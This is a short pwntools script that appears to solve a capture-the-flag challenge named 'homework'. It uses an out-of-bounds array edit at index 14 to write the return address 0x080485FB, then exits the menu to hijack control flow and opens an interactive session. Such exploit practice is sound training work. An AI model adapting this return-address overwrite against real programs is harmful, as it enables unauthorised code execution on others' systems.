#!/usr/bin/env python
# coding=utf-8

from pwn import *

p="./homework"
context.binary=p
pro=process(p)
#pro=remote("hackme.inndy.tw",7701)
ret_addr=str(0x080485FB)


pro.recvuntil("name? ")
pro.sendline("Coooool")
pro.recvuntil("dump all numbers")
pro.recvuntil(" > ")
pro.sendline("1")
pro.recvuntil("edit: ")
pro.sendline("14")
pro.recvuntil("How many? ")
pro.sendline(ret_addr)
pro.recvuntil("dump all numbers")
pro.recvuntil(" > ")
pro.sendline("0")
#pro.sendline(payload)



pro.interactive()
